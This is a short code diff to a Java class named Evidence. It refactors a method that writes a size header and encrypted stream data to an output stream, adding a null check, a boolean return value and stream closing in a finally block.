@@ -509,6 +509,36 @@ public final class Evidence {
         return true;
     }
 
+    public synchronized boolean writeEvidence(DataInputStream inputStream, int size) {
+        if (os == null) {
+            //#ifdef DEBUG
+            debug.error("os null");
+            //#endif
+            return false;
+        }
+
+        try {
+            os.write(Utils.intToByteArray(size));
+            encryption.encryptData(inputStream, os);
+        } catch (IOException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("writeEvidence");
+            //#endif
+            return false;
+        }finally{
+            if (os != null) {
+                try {
+                    os.close();
+                } catch (final IOException e) {
+                    return false;
+                }
+            }
+        }
+        
+        return true;
+    }
+
     /**
      * Write logs.
      * 
@@ -657,18 +687,6 @@ public final class Evidence {
         writeEvidence(WChar.getBytes(message, true));
         close();
     }
-
-    public void writeEvidence(DataInputStream inputStream, int size) {
-        try {
-            os.write(Utils.intToByteArray(size));
-            encryption.encryptData(inputStream, os);
-            os.close();
-        } catch (IOException e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            debug.error("writeEvidence");
-            //#endif
-        }
-    }
+   
 
 }
